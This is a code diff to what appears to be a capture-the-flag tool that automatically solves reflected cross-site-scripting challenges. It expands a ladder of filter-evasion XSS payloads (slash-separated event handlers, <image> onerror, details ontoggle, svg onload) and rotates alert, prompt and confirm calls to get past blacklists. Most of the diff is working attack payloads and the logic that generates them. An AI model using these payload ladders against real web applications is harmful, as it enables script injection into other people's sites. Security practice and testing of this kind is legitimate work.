@@ -42,16 +42,22 @@ def _marker_encodings(marker: str = "XSS") -> List[str]:
     ]
 
 
-# Context templates. ``{c}`` is replaced by an alert call, e.g. alert(`XSS`).
+# Context templates. ``{c}`` is replaced by a dialog call, e.g. alert(`XSS`).
 # Ordered roughly by reliability against common filters and headless checkers.
+# Slash-separated variants beat space blacklists; <image> covers filters that
+# strip every tag except <image> (browsers treat it as <img>).
 _CONTEXTS: List[Tuple[str, str]] = [
     ("input-autofocus-onfocus", "<input autofocus onfocus={c}>"),
+    ("input-autofocus-onfocus-slash", "<input/autofocus/onfocus={c}>"),
+    ("details-ontoggle", "<details open ontoggle={c}>x</details>"),
+    ("details-ontoggle-slash", "<details/open/ontoggle={c}>x</details>"),
+    ("body-onload", "<body onload={c}>"),
+    ("svg-onload", "<svg onload={c}>"),
+    ("svg-onload-slash", "<svg/onload={c}>"),
     ("select-autofocus-onfocus", "<select autofocus onfocus={c}><option>a</option></select>"),
     ("textarea-autofocus-onfocus", "<textarea autofocus onfocus={c}></textarea>"),
-    ("details-ontoggle", "<details open ontoggle={c}>x</details>"),
     ("img-onerror", "<img src=x onerror={c}>"),
-    ("svg-onload", "<svg onload={c}>"),
-    ("body-onload", "<body onload={c}>"),
+    ("image-onerror-slash", "<image/src/onerror={c}>"),
     ("video-onerror", "<video><source onerror={c}></video>"),
     ("marquee-onstart", "<marquee onstart={c}>x</marquee>"),
     ("iframe-srcdoc", "<iframe srcdoc=\"&lt;script&gt;{c}&lt;/script&gt;\"></iframe>"),
@@ -61,16 +67,24 @@ _CONTEXTS: List[Tuple[str, str]] = [
     ("js-uri", "javascript:{c}"),
 ]
 
-_DIALOGS = ("alert", "confirm", "prompt")
+# Dialog functions the headless checker logs (onAlert/onConfirm/onPrompt). Try
+# alert first, then prompt/confirm so a challenge that blocks only `alert` (or
+# `alert`+`confirm`) is still solved.
+_DIALOGS = ("alert", "prompt", "confirm")
 
 
 def build_ladder(marker: str = "XSS") -> List[Tuple[str, str]]:
-    """All (technique, payload) candidates, ordered best-first."""
+    """All (technique, payload) candidates, ordered best-first.
+
+    Quote-free markers lead (beat quote filters); within a context the dialog
+    functions rotate (beat alert/confirm blacklists).
+    """
     out: List[Tuple[str, str]] = []
     for enc in _marker_encodings(marker):
         for name, tmpl in _CONTEXTS:
-            call = f"alert({enc})"
-            out.append((f"{name}|{enc}", tmpl.replace("{c}", call)))
+            for dialog in _DIALOGS:
+                call = f"{dialog}({enc})"
+                out.append((f"{name}|{dialog}|{enc}", tmpl.replace("{c}", call)))
     return out
 
 
@@ -137,7 +151,7 @@ def solve(
     marker: str = "XSS",
     seed_blacklist: Optional[List[str]] = None,
     success_regex: Optional[re.Pattern] = None,
-    max_attempts: int = 16,
+    max_attempts: int = 40,
 ) -> SolveResult:
     """Iteratively solve a checker/bot-backed reflected-XSS endpoint.
 
@@ -196,7 +210,7 @@ def _cli(argv=None) -> int:
     p.add_argument("--marker", default="XSS")
     p.add_argument("--seed-blacklist", default="", help="Comma-separated known-blocked tokens")
     p.add_argument("--success-regex", default="", help="Custom win regex (default flag{...})")
-    p.add_argument("--max-attempts", type=int, default=16)
+    p.add_argument("--max-attempts", type=int, default=40)
     a = p.parse_args(argv)
 
     try:
